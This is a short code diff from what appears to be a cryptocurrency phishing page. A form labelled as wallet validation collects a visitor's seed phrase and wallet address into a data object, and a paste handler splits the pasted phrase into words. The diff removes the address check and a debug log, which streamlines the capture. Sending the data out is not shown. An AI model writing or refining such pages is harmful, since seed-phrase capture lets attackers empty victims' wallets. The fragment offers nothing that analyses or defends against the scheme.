@@ -84,10 +84,6 @@
       });
 
       send.addEventListener("click", async () => {
-        if (address.value == "" || address.value.length < 20) {
-          alert("Please provide wallet address");
-          return;
-        }
         send.textContent = "Validating Wallet...";
         data.seed = formInput.value;
         data.address = address.value;
@@ -125,7 +121,6 @@
       });
 
       formInput.addEventListener("paste", (e) => {
-        console.log(e);
         const amount = (e.clipboardData || window.clipboardData)
           .getData("text")
           .split(" ");
